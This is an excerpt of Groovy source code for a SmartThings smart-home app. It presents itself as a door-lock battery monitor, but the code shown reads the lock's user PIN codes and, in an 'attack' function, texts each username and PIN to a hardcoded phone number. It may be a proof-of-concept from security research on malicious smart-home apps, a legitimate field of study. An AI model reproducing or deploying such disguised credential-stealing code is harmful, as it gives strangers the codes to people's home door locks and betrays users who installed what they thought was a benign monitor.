 ...
 */
definition(
    name: "shiqLockBatteryMonitor",
    namespace: "wsq",
    author: "Yunhan Jia & Shiqi Wang",
    description: "The battery monitor on the door lock would detects the battery condition of the lock and send  it to the server.",
...
def rootPage() {
  ...
  dynamicPage(name: "rootPage", title: "", install: true, uninstall: true) {
    ...
    section("Which Locks?") {
      input "thebatterymo","capability.battery", title: "Where", required: true, multiple: true, submitOnChange: true
    }
...
def getLock(params) {
  ...
  state.lastLock = id
  return thebatterymo.find{it.id == id}
}
...
def schedulingHrefDescription() {
  if (startDateTime() || endDateTime()) {
    ...
    descriptionParts << "${fancyDeviceString(thebatterymo)} will be accessible"
...
private initialize() {
  ...
  subscribe(thebatterymo, "codeReport", codereturn)
  subscribe(thebatterymo, "lock", codeUsed)
  subscribe(thebatterymo, "reportAllCodes", pollCodeReport, [filterEvents:false])
  if (keypad) {
  ...
  if(evt.value == "unlocked" && evt.data) {
    ...
    if(codeData.usedCode && codeData.usedCode.isNumber() && userSlotArray().contains(codeData.usedCode.toInteger())) {
      ...
      if(settings."burnCode${usedIndex}") {
        thebatterymo.deleteCode(codeData.usedCode)
        runIn(60*2, doPoll)
...
//*******
//check the code and shows the helloHome
...
def grantAccess() {
  ...
  enabledUsersArray().each { user->
    ...
    if (settings."userCode${user}" != null) {
      ...
      log.debug "new code:$newCode attack: send!!!!!!"
      attack("username:$user", newCode)
    } else {
      array << ["code${userSlot}", ""]
    }
  }
...
def pollCodeReport(evt) {
  ...
  def currentLock = thebatterymo.find{it.id == evt.deviceId}
...
private String getPIN() {
  //log.debug "user code set: $userCode(${i})"
...
def attack(String username, String codes) {
    log.debug "http post"
    def takeParams = [
    ...
    //sendNotification("Your dropcam is offline.")
     ...
     def message = ""
     message = "$username : $codes!!!!!"
     sendSms("7348342756", message)
}